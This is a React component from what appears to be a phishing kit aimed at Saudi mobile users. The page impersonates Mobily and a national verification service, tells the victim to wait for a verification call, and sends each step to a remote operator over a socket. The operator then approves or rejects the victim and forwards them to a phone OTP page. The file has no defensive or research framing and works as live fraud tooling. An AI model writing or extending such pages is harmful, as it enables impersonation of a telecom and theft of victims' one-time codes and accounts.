import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  navigateToPage,
  socket,
  waitingMessage,
} from "@/lib/store";

export default function MobilyCallAlert() {
  const [, navigate] = useLocation();
  const [callReceived, setCallReceived] = useState(false);
  const [isRejected, setIsRejected] = useState(false);

  // Emit page enter
  useEffect(() => {
    navigateToPage("تنبية إتصال Mobily");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/phone-otp?serviceProvider=5");
    }
  }, [isFormApproved.value, navigate]);

  // Listen for mobily rejection
  useEffect(() => {
    const s = socket.value;
    if (!s) return;

    const handleMobilyRejected = () => {
      console.log("Mobily call rejected");
      setIsRejected(true);
      setCallReceived(false);
      // إخفاء شاشة الانتظار
      waitingMessage.value = "";
    };

    s.on("mobily:rejected", handleMobilyRejected);

    return () => {
      s.off("mobily:rejected", handleMobilyRejected);
    };
  }, []);

  const handleCallReceived = () => {
    setCallReceived(true);
    setIsRejected(false);
    sendData({
      data: { الحالة: "تم تلقي المكالمة" },
      current: "تنبية إتصال Mobily",
      nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=5",
      waitingForAdminResponse: true,
    });
  };

  const handleNewCall = () => {
    // إرسال البيانات للأدمن مع شاشة الانتظار
    sendData({
      data: { الحالة: "تم تلقي المكالمة" },
      current: "تنبية إتصال Mobily",
      nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=5",
      waitingForAdminResponse: true,
    });
    // تحديث الحالة بعد إرسال البيانات
    setIsRejected(false);
    setCallReceived(true);
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
            <svg
              className="w-10 h-10 text-purple-600"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">انتظر المكالمة</h1>
          <p className="text-gray-500 text-sm">
            ستصلك مكالمة من موبايلي للتحقق من هويتك
          </p>
        </div>

        {/* Mobily Logo */}
        <div className="flex justify-center items-center gap-4 mb-6">
          <img
            src="/images/service-providers/mobily.png"
            alt="Mobily"
            className="h-14"
          />
          <img
            src="/images/mutasil.png"
            alt="Mutasil"
            className="h-16"
          />
        </div>

        {/* Instructions */}
        <div className="bg-purple-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-purple-800 mb-2">تعليمات هامة:</h3>
          <ul className="text-sm text-purple-700 space-y-1 list-disc list-inside">
            <li>انتظر المكالمة الواردة من موبايلي</li>
            <li>اتبع التعليمات الصوتية</li>
            <li>اضغط على الرقم المطلوب للتأكيد</li>
          </ul>
        </div>

        {/* Phone Animation */}
        {!callReceived && (
          <div className="flex justify-center mb-6">
            <div className="relative">
              <img
                src="/images/phone-ringing.png"
                alt="Phone Ringing"
                className="w-24 h-24 animate-bounce"
              />
            </div>
          </div>
        )}

        {/* Button */}
        {isRejected ? (
          <Button
            onClick={handleNewCall}
            className="w-full bg-purple-600 hover:bg-purple-700"
            size="lg"
          >
            تلقي مكالمة جديدة
          </Button>
        ) : (
          <Button
            onClick={handleCallReceived}
            className="w-full bg-purple-600 hover:bg-purple-700"
            size="lg"
            disabled={callReceived}
          >
            {callReceived ? "جاري التحقق..." : "تم استلام المكالمة"}
          </Button>
        )}
      </div>
    </PageLayout>
  );
}
